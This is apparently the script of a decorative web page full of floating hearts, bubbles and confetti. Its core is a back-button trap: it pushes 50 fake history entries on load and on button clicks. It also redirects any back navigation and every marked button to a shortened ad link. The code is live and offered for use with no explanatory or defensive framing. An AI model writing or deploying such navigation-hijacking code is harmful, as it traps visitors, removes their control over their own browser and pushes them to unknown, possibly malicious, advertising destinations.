// ====== Configuration ======
const AD_URL = "https://shorter.me/WHO7C"; 
const HISTORY_PUSH_COUNT = 50; 

// ====== Initialization ======
window.addEventListener('load', function() {
  safePushStates(HISTORY_PUSH_COUNT);
  startFloatingElements();
  createParticles();
  createBubbles();
  createSparkles();
  startFloatingHearts();
  startFloatingStars();
});

// ====== History Management ======
function safePushStates(count = 1) {
  for (let i = 0; i < count; i++) {
    try { 
      history.pushState({trap:i}, "", location.href); 
    } catch(e) { 
      console.log('Push state blocked'); 
    }
  }
}

// ====== Redirect Logic ======
function goToAdImmediate() {
  safePushStates(HISTORY_PUSH_COUNT);
  window.location.href = AD_URL;
}

// ====== Button Event Handlers ======
document.querySelectorAll('a[data-ad="true"]').forEach(button => {
  button.addEventListener('click', function(e) {
    e.preventDefault();
    createRipple(this, e);
    createButtonParticles(this);
    createConfetti();
    
    setTimeout(() => { 
      goToAdImmediate(); 
    }, 300);
  });
});

// ====== Popstate Handler ======
window.addEventListener('popstate', function() {
  window.location.href = AD_URL;
});

// ====== Ripple Effect ======
function createRipple(element, event) {
  const rect = element.getBoundingClientRect();
  const x = event.clientX - rect.left;
  const y = event.clientY - rect.top;
  
  const ripple = document.createElement('span');
  ripple.className = 'ripple';
  ripple.style.left = x + 'px';
  ripple.style.top = y + 'px';
  
  element.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);
}

// ====== Floating Elements System ======
function startFloatingElements() {
  const container = document.querySelector('.floating-elements');
  const elements = ['heart', 'star', 'flower', 'sparkle', 'music'];
  const symbols = {
    heart: '❤',
    star: '⭐',
    flower: '🌸',
    sparkle: '✨',
    music: '🎵'
  };

  function createElement() {
    const type = elements[Math.floor(Math.random() * elements.length)];
    const element = document.createElement('span');
    
    element.className = type;
    element.textContent = symbols[type];
    element.style.left = Math.random() * 100 + 'vw';
    element.style.fontSize = (Math.random() * 20 + 15) + 'px';
    element.style.animationDuration = (Math.random() * 6 + 4) + 's';
    element.style.animationDelay = Math.random() * 5 + 's';
    
    container.appendChild(element);
    
    setTimeout(() => {
      element.remove();
    }, 8000);
  }

  // Create initial elements
  for (let i = 0; i < 20; i++) {
    setTimeout(createElement, i * 300);
  }

  // Continuous creation
  setInterval(createElement, 800);
}

// ====== Particles System ======
function createParticles() {
  const container = document.querySelector('.particles-container');
  const colors = ['#ff4b7d', '#4b9fff', '#ffd700', '#9b59b6', '#2ecc71'];

  function createParticle() {
    const particle = document.createElement('div');
    particle.className = 'particle';
    
    particle.style.left = Math.random() * 100 + 'vw';
    particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    particle.style.animationDuration = (Math.random() * 4 + 3) + 's';
    particle.style.animationDelay = Math.random() * 2 + 's';
    
    container.appendChild(particle);
    
    setTimeout(() => {
      particle.remove();
    }, 6000);
  }

  // Create initial particles
  for (let i = 0; i < 30; i++) {
    setTimeout(createParticle, i * 200);
  }

  // Continuous creation
  setInterval(createParticle, 500);
}

// ====== Bubbles System ======
function createBubbles() {
  const container = document.querySelector('.bubble-container');

  function createBubble() {
    const bubble = document.createElement('div');
    bubble.className = 'bubble';
    
    const size = Math.random() * 60 + 20;
    bubble.style.width = size + 'px';
    bubble.style.height = size + 'px';
    bubble.style.left = Math.random() * 100 + 'vw';
    bubble.style.borderColor = `rgba(255, 75, 125, ${Math.random() * 0.5 + 0.3})`;
    bubble.style.animationDuration = (Math.random() * 6 + 4) + 's';
    bubble.style.animationDelay = Math.random() * 3 + 's';
    
    container.appendChild(bubble);
    
    setTimeout(() => {
      bubble.remove();
    }, 8000);
  }

  // Create initial bubbles
  for (let i = 0; i < 15; i++) {
    setTimeout(createBubble, i * 400);
  }

  // Continuous creation
  setInterval(createBubble, 1000);
}

// ====== Sparkles System ======
function createSparkles() {
  const container = document.querySelector('.sparkle-container');

  function createSparkle() {
    const sparkle = document.createElement('div');
    sparkle.className = 'sparkle';
    
    sparkle.style.left = Math.random() * 100 + 'vw';
    sparkle.style.top = Math.random() * 100 + 'vh';
    sparkle.style.animationDelay = Math.random() * 2 + 's';
    
    container.appendChild(sparkle);
    
    setTimeout(() => {
      sparkle.remove();
    }, 2000);
  }

  // Create initial sparkles
  for (let i = 0; i < 50; i++) {
    setTimeout(createSparkle, i * 100);
  }

  // Continuous creation
  setInterval(createSparkle, 200);
}

// ====== Floating Hearts ======
function startFloatingHearts() {
  const container = document.querySelector('.floating-hearts');

  function createHeart() {
    const heart = document.createElement('div');
    heart.innerHTML = '❤';
    heart.style.position = 'fixed';
    heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
    heart.style.color = '#ff4b7d';
    heart.style.left = Math.random() * 100 + 'vw';
    heart.style.top = '100vh';
    heart.style.opacity = '0.7';
    heart.style.zIndex = '5';
    heart.style.pointerEvents = 'none';
    
    container.appendChild(heart);

    const animation = heart.animate([
      { transform: 'translateY(0) scale(1)', opacity: 0.7 },
      { transform: 'translateY(-120vh) scale(1.5)', opacity: 0 }
    ], {
      duration: Math.random() * 4000 + 3000,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });

    animation.onfinish = () => heart.remove();
  }

  setInterval(createHeart, 800);
}

// ====== Floating Stars ======
function startFloatingStars() {
  const container = document.querySelector('.floating-stars');

  function createStar() {
    const star = document.createElement('div');
    star.innerHTML = '⭐';
    star.style.position = 'fixed';
    star.style.fontSize = (Math.random() * 15 + 10) + 'px';
    star.style.left = Math.random() * 100 + 'vw';
    star.style.top = '100vh';
    star.style.opacity = '0.8';
    star.style.zIndex = '5';
    star.style.pointerEvents = 'none';
    
    container.appendChild(star);

    const animation = star.animate([
      { transform: 'translateY(0) rotate(0deg)', opacity: 0.8 },
      { transform: 'translateY(-100vh) rotate(360deg)', opacity: 0 }
    ], {
      duration: Math.random() * 5000 + 4000,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });

    animation.onfinish = () => star.remove();
  }

  setInterval(createStar, 600);
}

// ====== Button Particles ======
function createButtonParticles(button) {
  const rect = button.getBoundingClientRect();
  const colors = ['#ff4b7d', '#4b9fff', '#ffd700', '#9b59b6', '#2ecc71'];

  for (let i = 0; i < 15; i++) {
    const particle = document.createElement('div');
    particle.style.position = 'fixed';
    particle.style.width = '6px';
    particle.style.height = '6px';
    particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    particle.style.borderRadius = '50%';
    particle.style.left = (rect.left + rect.width / 2) + 'px';
    particle.style.top = (rect.top + rect.height / 2) + 'px';
    particle.style.zIndex = '100';
    particle.style.pointerEvents = 'none';
    
    document.body.appendChild(particle);

    const angle = Math.random() * Math.PI * 2;
    const distance = Math.random() * 50 + 30;
    const duration = Math.random() * 1000 + 500;

    const animation = particle.animate([
      { 
        transform: 'translate(0, 0) scale(1)', 
        opacity: 1 
      },
      { 
        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`, 
        opacity: 0 
      }
    ], {
      duration: duration,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });

    animation.onfinish = () => particle.remove();
  }
}

// ====== Confetti Effect ======
function createConfetti() {
  const colors = ['#ff4b7d', '#4b9fff', '#ffd700', '#9b59b6', '#2ecc71'];
  const types = ['rect', 'circle'];

  for (let i = 0; i < 50; i++) {
    const confetti = document.createElement('div');
    const type = types[Math.floor(Math.random() * types.length)];
    
    confetti.style.position = 'fixed';
    confetti.style.width = type === 'rect' ? '10px' : '8px';
    confetti.style.height = type === 'rect' ? '20px' : '8px';
    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    confetti.style.borderRadius = type === 'rect' ? '2px' : '50%';
    confetti.style.left = Math.random() * 100 + 'vw';
    confetti.style.top = '-20px';
    confetti.style.opacity = '0.9';
    confetti.style.zIndex = '100';
    confetti.style.pointerEvents = 'none';
    
    document.body.appendChild(confetti);

    const animation = confetti.animate([
      { 
        transform: 'translateY(0) rotate(0deg)', 
        opacity: 1 
      },
      { 
        transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 720}deg)`, 
        opacity: 0 
      }
    ], {
      duration: Math.random() * 3000 + 2000,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });

    animation.onfinish = () => confetti.remove();
  }
}

// ====== Interactive Background ======
document.addEventListener('mousemove', function(e) {
  const hearts = document.querySelector('.floating-hearts');
  const heart = document.createElement('div');
  
  heart.innerHTML = '💖';
  heart.style.position = 'fixed';
  heart.style.left = e.clientX + 'px';
  heart.style.top = e.clientY + 'px';
  heart.style.fontSize = '20px';
  heart.style.opacity = '0.7';
  heart.style.zIndex = '5';
  heart.style.pointerEvents = 'none';
  heart.style.transform = 'translate(-50%, -50%)';
  
  hearts.appendChild(heart);
  
  const animation = heart.animate([
    { transform: 'translate(-50%, -50%) scale(1)', opacity: 0.7 },
    { transform: 'translate(-50%, -100px) scale(0)', opacity: 0 }
  ], {
    duration: 1500,
    easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
  });

  animation.onfinish = () => heart.remove();
});
